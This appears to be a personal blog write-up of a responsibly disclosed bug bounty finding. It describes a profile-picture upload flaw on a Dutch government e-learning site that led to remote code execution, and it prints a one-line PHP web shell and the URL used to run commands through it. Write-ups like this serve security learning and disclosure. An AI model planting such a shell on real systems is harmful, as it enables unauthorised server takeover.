---
title: Unveiling RCE on a Dutch Government Website
date: 2023-08-31 10:00:00 +600
catagories: [Bug Bounty]
tags: [file upload bypass,rce,bug bounty,dutch government] #Tag names should always be in lower case.
---

## Introduction

Assalamu Alaikum! This is Nayeem Islam. I'm a currently an undergraduate student and a passionate webapp security learner from Bangladesh. This is my first write-up, and I'll be sharing the details of how I discovered a Remote Code Execution (RCE) vulnerability on a Dutch government website. You can skip my background story and head to the exploitation part ahead.

## Background

My bug bounty journey started in September 2021. That time, I saw a few researchers sharing a picture of a cool black T-shirt on Twitter. Since then, it's been my dream to get Dutch government swag.

I began my journey by targeting low-hanging fruits, often receiving informative or non-applicable responses on platforms like HackerOne. I kept trying and finally found my first valid bug in April 2022. That valid bug was a motivation booster. So, I decided to test my luck with Dutch government websites.

## My Journey

I gathered some articles about hacking the Dutch government to get an initial idea of the process. Reading those articles, I learned that they only offer swags for impactful bugs, ruling out any low-hanging fruits. 

Googled for scopes and found this [repository](https://gist.github.com/testerzs/cf3085ec0bad6b1d661887d4f44e3574). I found a site related to healthcare. That time I didn't know much recon techniques except for basic subdomain enumeration.

I found only one live subdomain using `crt.sh`. It was an e-learning platform. Anyone can sign-up on an e-learning portal. Right? 

So, I chose this as my target because more functionality increase the possibility of finding more bugs.  noticed the e-learning portal was using the PHP Laravel framework which further fueled my anticipation of finding a bug.

## File Upload Bypass

So my target was `elearning.example.nl`. I created an account and navigated to my profile then tested for XSS, HTMLi, CSRF and got nothing.

Later I started testing profile picture upload feature. I tried uploading a simple `test.txt` file & the upload was successful. At first I was very happy then I opened the image url and found this error.
```
There is an error with this image file
``` 
also you can see below my `txt` file has been renamed and converted to `jpg`. 😥 

![Dutch Government bug bounty](https://i.postimg.cc/J0VMKYL7/url1.png "Dutch Responsible Disclosure")

I tried IDOR on this endpoint `/storage/528` because this number was user identifier & sequential. It didn't work. I took a break for a few hours then started looking into it again.

This time I noticed the sub directory `conversion`. I asked myself what the hell is this directory doing here? Maybe they are storing my original text file in the `/528/` directory then converting it to jpg and saving it to `conversion`.

I tried accessing the uploaded `text` file from `/528/` directly. So, the URL looked like this. 

 ```
 https://elearning.example.nl/storage/528/my-image.txt
 ``` 

My assumption was right. The `txt & html` file executed! Wrote a good report with PoC and submitted it.

## Exploiting RCE

Later, I learned about File Upload to RCE. Then uploaded this simple one liner php shell to see whether RCE is achievable.

```
<?php system($_GET['cmd']); ?>
``` 
Opened profile image in a new tab and modified the URL like this.
```
https://elearning.example.nl/storage/528/shell.php?cmd=id
```
The outcome? Voilà! I had successfully achieved Remote Code Execution. 😎

![Dutch Government bug bounty](https://i.postimg.cc/TYfffc6F/rce-1.png "Dutch Responsible Disclosure")

Send additional report to prove impact the impact of this newfound vulnerability.

## End Story

I was happy and hopeless at the same time. This discovery seemed too easy, raising the possibility of it being a duplicate. To my surprise, my report was triaged! NCSC-NL also advised me not to upload shell on their system! 😜

![Dutch Government bug bounty](https://i.postimg.cc/wT3FyZv1/fixed.png "Dutch Responsible Disclosure")

This issue was resolved within a month and I was awarded the Dream Swag! It was my first critical finding on a real target as well as my first ever bug submission on the Dutch Government. I thought I was lucky but I was wrong. My swag got lost in the shipment. 😞

Before this discovery, I had never completed a single Portswigger lab on File Upload or Command Execution, except for basic TryHackMe rooms.

I learned a ton of lessons throughout this journey. They say, "Enjoy the journey, not just the destination." How true that turned out to be.

### Timeline 

- 18-06-2022 - Reported the vulnerabilty.

- 19-06-2022 - Received the first response.

- 20-06-2022 - Bug confirmed and triaged.

- 18-07-2022 - Bug Resolved.

<br>
I'd like to extend my gratitude to all the members of the [Bug Bounty Community of Bangladesh](https://twitter.com/bbcbd_official) for their mentorship and the infosec community on [Twitter](https://twitter.com/hashtag/bugbounty) for sharing invaluable research and tips.

Thank you for taking the time to read this lengthy blog.

You can follow me on

- Twitter  : twitter.com/nayeems3c
- LinkedIn : https://www.linkedin.com/in/nayeem-islam-a496011a2/

